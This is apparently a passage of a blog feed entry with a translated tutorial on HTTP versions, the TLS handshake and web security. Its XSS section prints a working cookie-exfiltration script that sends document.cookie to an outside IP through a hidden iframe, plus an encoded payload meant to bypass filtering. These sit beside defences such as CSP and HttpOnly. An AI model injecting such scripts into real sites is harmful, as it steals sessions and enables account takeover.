-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span><br></pre></td></tr></table></figure>
-<h4 id="Disadvantages"><a href="#Disadvantages" class="headerlink" title="Disadvantages"></a>Disadvantages</h4><p>The main problem with HTTP/1.0 is that: <strong>only one request can be sent per TCP connection</strong>. Once the data is sent, the link is closed. To request another resource, another TCP connection must be created. The TCP connection requires three handshakes between the client and the server, and starts off slowly due to slow start, making it costly to create a new TCP connection.</p>
-<p>** To solve this problem, some browsers use the non-standard field <code>Connection</code>. **</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
-<p>The above field requires the server not to close the TCP connection so that other requests can reuse it, and that reusable TCP connection will not be disconnected until either the client or the server actively closes it. However, this method is not standard.</p>
-<h3 id="HTTP-1-1"><a href="#HTTP-1-1" class="headerlink" title="HTTP/1.1"></a>HTTP/1.1</h3><p>Used from 1997 to 201 several, until HTTPS.</p>
-<h4 id="Persistent-connections"><a href="#Persistent-connections" class="headerlink" title="Persistent connections"></a>Persistent connections</h4><ul>
-<li>The <strong>biggest change</strong> in version 1.1 was the introduction of <strong>persistent connection</strong>, i.e. TCP connections are not closed by default, can be reused by multiple requests and do not need to declare <code>Connection:keep-alive</code>.</li>
-<li>A connection is actively closed when there has been no communication between the client and the server for a period of time. However, the normative practice is for the client to send <code>Connection: close</code> on the last request, explicitly asking the server to close the TCP connection.</li>
-</ul>
-<p>**Note: **For the same domain name, most browsers allow <strong>6 persistent connections</strong> to be established at the same time.</p>
-<h4 id="Pipeline-mechanism"><a href="#Pipeline-mechanism" class="headerlink" title="Pipeline mechanism"></a>Pipeline mechanism</h4><p>In version 1.0, within the same TCP connection, if a client wanted to <strong>request two resources</strong>, it would <strong>send request A</strong> first, then wait for the server to respond, <strong>and then send request B</strong> after receiving the response**.</p>
-<p>In version 1.1 the <strong>pipelining</strong> mechanism was introduced, which allows the browser to <strong>send both an A request and a B request</strong>, but the server still responds to the A request first, in order, and then to the B request when it is done.</p>
-<p>Thus, the pipelining mechanism allows <strong>clients to send multiple requests</strong> at the same time over the same TCP connection.</p>
-<h4 id="Content-Length-field"><a href="#Content-Length-field" class="headerlink" title="Content-Length field"></a>Content-Length field</h4><p>** Used to declare the length of the data for this response. **</p>
-<h4 id="chunked-transfer-encoding"><a href="#chunked-transfer-encoding" class="headerlink" title="chunked-transfer-encoding"></a>chunked-transfer-encoding</h4><p>In short, it means that the server <strong>sends a piece of data as it is generated</strong>, i.e. it uses the stream mode instead of the buffer mode.</p>
-<p>Therefore, version 1.1 can use chunked transfer encoding instead of the <code>Content-Length</code> field. Whenever <strong>a request or response has a <code>Transfer-Encoding</code> field</strong> in its header, it indicates that the response will consist of an undetermined number of chunks of data.</p>
-<p><strong>Note:</strong> Each non-empty block of data will be preceded by a hexadecimal value to indicate the length of the block. It ends with a block of size 0, indicating that the data for this response has been sent. Examples are as follows.</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">25</span><br><span class="line">This is the data in the first chunk</span><br><span class="line"></span><br><span class="line">1C</span><br><span class="line">and this is the second one</span><br><span class="line"></span><br><span class="line">3</span><br><span class="line">con</span><br><span class="line"></span><br><span class="line">8</span><br><span class="line">sequence</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure>
-<h4 id="Other-features"><a href="#Other-features" class="headerlink" title="Other features"></a>Other features</h4><ul>
-<li>Version 1.1 also adds many new verb methods such as <code>PUT</code>, <code>PATCH</code>, <code>HEAD</code>, <code>OPTIONS</code>, <code>DELETE</code></li>
-<li>A new <code>HOST</code> field** has been added to the client request headers to specify the server’s domain name. With the <code>HOST</code> field it is possible to send a request to a different website on the same server. (Laying the groundwork for the rise of virtual machines)</li>
-</ul>
-<h4 id="Disadvantages-1"><a href="#Disadvantages-1" class="headerlink" title="Disadvantages"></a>Disadvantages</h4><p>There is <strong>Head-of-line blocking</strong>. Although multiplexing of TCP connections is allowed, data communication within the <strong>same TCP connection is still sequential</strong> and the server can only respond to the next request after processing the response to the first one. If the response to the previous request is slow, then there will be many requests queued up behind it.</p>
-<p>Ways to avoid queue head blocking are.</p>
-<ol>
-<li><strong>reduce the number of requests</strong>. For example, merging scripts and stylesheets, embedding images in CSS code</li>
-<li><strong>Multiple simultaneous persistent connections</strong>. For example, domain sharding, where the required downloads can come from multiple domains, can solve the concurrency limit.</li>
-</ol>
-<h3 id="HTTP-2"><a href="#HTTP-2" class="headerlink" title="HTTP/2"></a>HTTP/2</h3><h4 id="Binary-protocol"><a href="#Binary-protocol" class="headerlink" title="Binary protocol"></a>Binary protocol</h4><p>HTTP/1.1 has a text (ASCII) header and a text or binary data body. HTTP/2, however, is a <strong>thoroughly binary protocol</strong>, where both the header and the data body are binary, and are collectively referred to as “frames”: header frames and data frames.</p>
-<p>The advantage of the binary protocol is that additional frames can be defined.</p>
-<h4 id="Multiplexing"><a href="#Multiplexing" class="headerlink" title="Multiplexing"></a>Multiplexing</h4><p>In HTTP/2, both the client and the browser can send multiple requests and responses at the same time over the same TCP connection, without having to correspond to each other in order, thus avoiding the problem of queue head blocking.</p>
-<p>For example, in a TCP connection, the server receives both request A and request B. It responds to request A first, which turns out to be very time-consuming to process, so it sends the part of request A that has already been processed, then processes the response to request B, and when it’s done, it processes the rest of the request that sent A. We call this <strong>duplex, real-time communication</strong> <strong>multiplex</strong>.</p>
-<h4 id="data-flow"><a href="#data-flow" class="headerlink" title="data flow"></a>data flow</h4><p>In HTTP/2, <strong>packets are sent out of order</strong>; consecutive packets inside the same connection may belong to different responses, so it is necessary to <strong>mark</strong> the packet to indicate which response it belongs to.</p>
-<p>HTTP/2 refers to <strong>all packets</strong> of each request or response as a <strong>stream</strong>. Each stream is given a unique number. When a packet is sent, it must be marked with a stream ID that identifies which stream it belongs to. In addition, all stream IDs sent by the client are odd numbers and all stream IDs sent by the server are even numbers.</p>
-<p>When the stream is sent halfway, both the client and the server can signal the stream to be cancelled. In HTTP/1.1, the only way to cancel a stream was to close the TCP connection. HTTP/2 can cancel a request while ensuring that the TCP connection is still open and can be reused for other requests.</p>
-<p>The client can also specify the priority of the data stream, the higher the priority the sooner the server will respond to it.</p>
-<h4 id="header-compression"><a href="#header-compression" class="headerlink" title="header compression"></a>header compression</h4><p>As many fields in the <strong>request headers are repeated in each request</strong> (e.g. Cookie, User Agent, etc.), this can result in a lot of wasted bandwidth. HTTP/2 optimises this by introducing <strong>header compression</strong>. On the one hand, headers <strong>are compressed using methods such as <code>gzip</code></strong> before being sent; on the other hand, the client and server maintain a <strong>header table</strong> which is a mapping of <strong>fields and index numbers</strong>, after which only the index numbers are sent to improve speed.</p>
-<h4 id="Server-Push"><a href="#Server-Push" class="headerlink" title="Server Push"></a>Server Push</h4><p>HTTP/2 allows the server to send resources to the client unsolicited without receiving a request.</p>
-<p>For example, if a client requests a web page containing many static resources, the server will actively send these static resources to the client along with the web page, so that there is no need to wait for the client to receive the web page and parse the HTML to find static resources before requesting static resources.</p>
-<h2 id="HTTPS-Extra"><a href="#HTTPS-Extra" class="headerlink" title="HTTPS - Extra"></a>HTTPS - Extra</h2><p>The security of Internet communications is built on the <strong>SSL/TLS</strong> protocol.</p>
-<p><strong>Note</strong>: SSL - <strong>Secure Sockets Layer</strong>, TLS - an upgrade from SSL</p>
-<h3 id="Reasons-for-using-HTTPS-amp-what-it-does"><a href="#Reasons-for-using-HTTPS-amp-what-it-does" class="headerlink" title="Reasons for using HTTPS &amp; what it does"></a>Reasons for using HTTPS &amp; what it does</h3><p><strong>Comparison:</strong></p>
-<ul>
-<li><p>HTTP does not use SSL/TLS and is therefore unencrypted communication, all information is transmitted in clear text</p>
-<ol>
-<li><strong>Eavesdropping risk:</strong> third parties can intercept and be informed of the content of communications</li>
-<li><strong>tampering:</strong> third parties can intercept and modify the content of communications</li>
-<li><strong>pretending:</strong> a third party can impersonate another person to participate in the communication</li>
-</ol>
-</li>
-<li><p>Benefits of HTTPS based on SSL/TLS protocol</p>
-<ol>
-<li><strong>All messages are transmitted encrypted</strong> - no eavesdropping</li>
-<li><strong>with a checksum mechanism</strong> - any tampering with the content of the communication can be detected by both parties to the communication</li>
-<li><strong>Equipped with a certificate of identity</strong> - prevents identity impersonation</li>
-</ol>
-</li>
-</ul>
-<h3 id="The-basic-operation-of-the-SSL-TLS-protocol"><a href="#The-basic-operation-of-the-SSL-TLS-protocol" class="headerlink" title="The basic operation of the SSL/TLS protocol"></a>The basic operation of the SSL/TLS protocol</h3><p>The basic idea of the protocol is:** asymmetric encryption: public key encryption, private key decryption**. That is, the client first asks the server for the public key, then encrypts the message with the public key, and the server receives the ciphertext and decrypts it with its own private key.</p>
-<ol>
-<li><p><strong>How to ensure that the public key cannot be tampered with?</strong></p>
-<p>Answer: <strong>Put the public key into the digital certificate</strong>, as long as the certificate is trusted, then the public key is trusted.</p>
-</li>
-<li><p><strong>How to reduce the time required for encryption with a public key that is too computationally intensive?</strong></p>
-<p>Answer: For each conversation (session), the client and the server will generate a “conversation key” (session key), which will be used to encrypt the message. As the session key is a symmetric encryption, it is very fast, so if the server public key is only used to encrypt the session key itself, the time consumed for encryption is greatly reduced.</p>
-</li>
-</ol>
-<p>So, the basic process of the SSL/TLS protocol is</p>
-<ol>
-<li>the client requests and verifies the public key <strong>from the server</strong> - the handshake phase</li>
-<li>both parties negotiate <strong>to generate a “conversation key “</strong></li>
-<li>both parties use the “conversation key “ <strong>for encrypted communication</strong></li>
-</ol>
-<h3 id="Handshake-phase"><a href="#Handshake-phase" class="headerlink" title="Handshake phase"></a>Handshake phase</h3><p>The handshake phase involves four communications and all communications during this phase are in plaintext.</p>
-<h4 id="Phase-1-The-client-sends-a-request"><a href="#Phase-1-The-client-sends-a-request" class="headerlink" title="Phase 1: The client sends a request"></a>Phase 1: The client sends a request</h4><p>First, the client sends an encrypted communication request to the server. The request it sends is mainly about the following.</p>
-<ol>
-<li>the supported protocol version, e.g. TLS 1.0</li>
-<li>a random number generated by the client to be used later to generate a “conversation key”</li>
-<li>the encryption method supported, e.g. RSA public key encryption</li>
-<li>supported compression methods</li>
-</ol>
-<h4 id="Phase-2-Server-Response"><a href="#Phase-2-Server-Response" class="headerlink" title="Phase 2: Server Response"></a>Phase 2: Server Response</h4><p>The server receives a request from the client and sends a response to the client. The response mainly includes the following.</p>
-<ol>
-<li>confirmation of the version of the encrypted communication protocol used. If the two sides do not support the same version, the server will close this encrypted communication</li>
-<li>a random number generated by the server to be used later to generate the “conversation key”</li>
-<li>confirmation of the encryption method used</li>
-<li>the server certificate</li>
-</ol>
-<h4 id="Phase-3-Client-Response"><a href="#Phase-3-Client-Response" class="headerlink" title="Phase 3: Client Response"></a>Phase 3: Client Response</h4><p>When the client receives the response from the server, it first verifies the server’s digital certificate.</p>
-<p>If <strong>1. the certificate is not credible. 2. the domain name in the certificate does not match the actual domain name. 3. the certificate has expired</strong>, a warning is displayed to the visitor, giving him/her the option to continue the communication or not.</p>
-<p>If there is no problem with the certificate, the client will <strong>take the server’s public key</strong> from the certificate and send a response to the server with the following main contents.</p>
-<ol>
-<li>A random number generated by the client. The random number is encrypted with the public key to prevent eavesdropping.</li>
-<li>A notification of the change in encoding. Indicates that subsequent messages will be sent using the mutually agreed encryption method and key.</li>
-<li>client end of handshake notification. Indicates the end of the client’s handshake phase, this item is also the hash value of all content sent earlier and is used for server verification.</li>
-</ol>
-<p><strong>Note:</strong> The random number generated in this phase is the third random number (“pre-master key”) that appears throughout the handshake phase. With this, both the client and the server have three random numbers at the same time, and then each side generates the same “session key” for the session, using a pre-agreed encryption method.</p>
-<h4 id="Phase-4-Final-server-response"><a href="#Phase-4-Final-server-response" class="headerlink" title="Phase 4: Final server response"></a>Phase 4: Final server response</h4><p>Once the server has received the third random number, it calculates and generates the “session key” for the current session. A final response is then sent to the client. The main contents are as follows.</p>
-<ol>
-<li>Notification of code change. This indicates that the subsequent message will be sent with the agreed encryption method and key. 2.</li>
-<li>End of server handshake notification. Indicates that the handshake phase of the server has ended. This item is also the hash value of all the content sent earlier and is used for verification by the client.</li>
-</ol>
-<p>At this point, the entire handshake phase is complete. Next, the client and server communicate encrypted, which is <strong>exactly the same as the normal HTTP protocol</strong>, <strong>except that all sent content is encrypted using the “session key”</strong>.</p>
-<h2 id="Web-Security"><a href="#Web-Security" class="headerlink" title="Web Security"></a>Web Security</h2><h3 id="XSS-Cross-Site-Scripting"><a href="#XSS-Cross-Site-Scripting" class="headerlink" title="XSS - Cross Site Scripting"></a>XSS - Cross Site Scripting</h3><h4 id="Introduction-2"><a href="#Introduction-2" class="headerlink" title="Introduction"></a>Introduction</h4><p>XSS, known as <strong>Cross-site scripting</strong>, or cross-site scripting in Chinese, is a type of <strong>attack</strong> on the security vulnerability of web applications, i.e. a type of <strong>code injection</strong>. This type of attack usually involves both HTML and user scripting languages (mainly JavaScript).</p>
-<p>For example, posting a malicious piece of JavaScript code on a web forum in JavaScript is a script injection, while at the same time if the content of this code has the ability to request an external server, then it is called XSS.</p>
-<p>Therefore, it can be understood as <strong>XSS (cross-site scripting) = script injection + the ability to request an external server</strong>.</p>
-<h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><p>For example, the following code is written for posting content in a forum site.</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;script</span><br><span class="line">  while (true) &#123;</span><br><span class="line">    alert(&#x27;keep popping up windows&#x27;)</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>Assuming the forum site has no filtering or other defence mechanisms, any user visiting this thread will have this pop-up popping up all the time in the client interface.</p>
-<p>**This is script injection in its simplest form. **Of course this script is not substantially more harmful then XSS is based on a script injection method to accomplish this, but it is injecting a script that contains a request for cross-site functionality.</p>
-<p>For example, in the forum site mentioned above, the following code is injected.</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;script</span><br><span class="line">  (function(window, document) &#123;</span><br><span class="line">    // Construct the URL for the leaked information</span><br><span class="line">    var cookies = document.cookie;</span><br><span class="line">    var xssURIBase = &quot;http://192.168.123.123/myxss/&quot;;</span><br><span class="line">    var xssURI = xssURIBase + window.encodeURI(cookies);</span><br><span class="line">    // Create a hidden iframe for communication</span><br><span class="line">    var hideFrame = document.createElement(&quot;iframe&quot;);</span><br><span class="line">    hideFrame.height = 0;</span><br><span class="line">    hideFrame.width = 0;</span><br><span class="line">    hideFrame.style.display = &quot;none&quot;;</span><br><span class="line">    hideFrame.src = xssURI;</span><br><span class="line">    // start</span><br><span class="line">    document.body.appendChild(hideFrame);</span><br><span class="line">&#125;)(window, document);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>This code will pass the cookie of any user who visits the post to a server with the name <code>http://192.168.123.123/myxss/</code>, which can then take this cookie and visit the corresponding website and log into the user’s account, which can then perform other operations.</p>
-<p>Therefore, the above code is XSS.</p>
-<h3 id="CSRF-Cross-Site-Request-Forgery"><a href="#CSRF-Cross-Site-Request-Forgery" class="headerlink" title="CSRF - Cross Site Request Forgery"></a>CSRF - Cross Site Request Forgery</h3><h4 id="Introduction-3"><a href="#Introduction-3" class="headerlink" title="Introduction"></a>Introduction</h4><p>CSRF, known as <strong>Cross-site request forgery</strong>, is a form of cross-site request forgery. It is an attack method that allows a user to perform some unintended actions** (such as name change, post deletion, emailing, etc.) on a currently logged-in web application.</p>
-<h4 id="Attack-Principle"><a href="#Attack-Principle" class="headerlink" title="Attack Principle"></a>Attack Principle</h4><p>Generally speaking, CSRF is implemented by XSS, on top of cross-site scripting, to implement forged requests, causing the victim to perform actions that he or she would not have intended to perform.</p>
-<p>**Note: CSRF can also be implemented without XSS. **</p>
-<h4 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h4><p>After the external server has successfully obtained the user’s cookie, it can use the cookie to forge a series of requests to the forum website, such as changing the user’s name, changing the user’s password, etc. At this point, the attack can be called a CSRF.</p>
-<h3 id="Protection-against-XSS-and-CSRF-⭐️"><a href="#Protection-against-XSS-and-CSRF-⭐️" class="headerlink" title="Protection against XSS and CSRF ⭐️"></a>Protection against XSS and CSRF ⭐️</h3><p><em><strong>Core idea: don’t trust any external source data!!!</strong></em></p>
-<p>Generally speaking, most CSRF is based on XSS, so it can be said that by defending against XSS, you are basically defending against CSRF as well.</p>
-<p>For the prevention of XSS, there are two main methods as follows.</p>
-<ol>
-<li><strong>Input filtering: thorough sensitive character filtering of external input</strong> - front end + back end</li>
-<li><strong>Output filtering: when displayed on the page, do some processing so that sensitive code scripts cannot be executed smoothly</strong> - front-end</li>
-</ol>
-<p>Theoretically, wherever there is input data, there is an XSS vulnerability. JavaScript scripts can be injected into the database in various forms (e.g. plaintext, encoded, etc.).</p>
-<p>As mentioned above JS can be injected in a variety of illegal forms, the main illegal forms are of two types.</p>
-<ol>
-<li><p><strong>Plaintext:</strong></p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  ... <span class="comment">// js malicious code</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>To handle the filtering of plaintext injections.</p>
-</li>
-<li><p><strong>Coding:</strong></p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">u0026u006cu0074u003bu0073u0063u0072u0069u0070u0074u0026u0067u0074u003bu0061u006cu0065u0072u0074u0028u0026u0023u0033u0039u003bu6211u662fu0078u0073u0073uff0cu4f60u6709u9ebbu70e6u4e86u0026u0023u0033u0039u003bu0029u0026u006cu0074u003bu002fu0073u0063u0072u0069u0070u0074u0026u0067u0074u003b</span><br></pre></td></tr></table></figure>
-<p>The above encoding is unicode, which bypasses the <code>htmlSpecialChars</code> filter and is imported into the library, and then when the message is displayed, the html automatically converts the unicode encoding into plaintext, i.e. a real executable script.</p>
-<p>Since not only unicode can be injected, but other types of encoding as well (for similar reasons), we need to try to set the character encoding of the page to one (e.g. unicode: utf-8) so that we can focus on unicode injection.</p>
-</li>
-</ol>
-<h4 id="Some-other-general-prevention-methods"><a href="#Some-other-general-prevention-methods" class="headerlink" title="Some other general prevention methods"></a>Some other general prevention methods</h4><ol>
-<li><p>add the <code>Http Header</code> of the <code>Content Security Policy</code> to the output html</p>
-<p>What it does: Prevents the page from being embedded in a third-party script file when attacked by XSS</p>
-</li>
-<li><p>add <code>HttpOnly</code> parameter when setting cookies</p>
-<p>Function: To prevent cookie information from being stolen when the page is attacked by XSS</p>
-<p>Disadvantage: the website’s own <code>JavaScript</code> code cannot manipulate cookies</p>
-</li>
-<li><p>check the Referer parameter of the request when developing the API</p>
-<p>Effect: It can prevent CSRF attacks to a certain extent</p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>Network</category>
-      </categories>
-      <tags>
-        <tag>HTTP</tag>
       </tags>
   </entry>
   <entry>
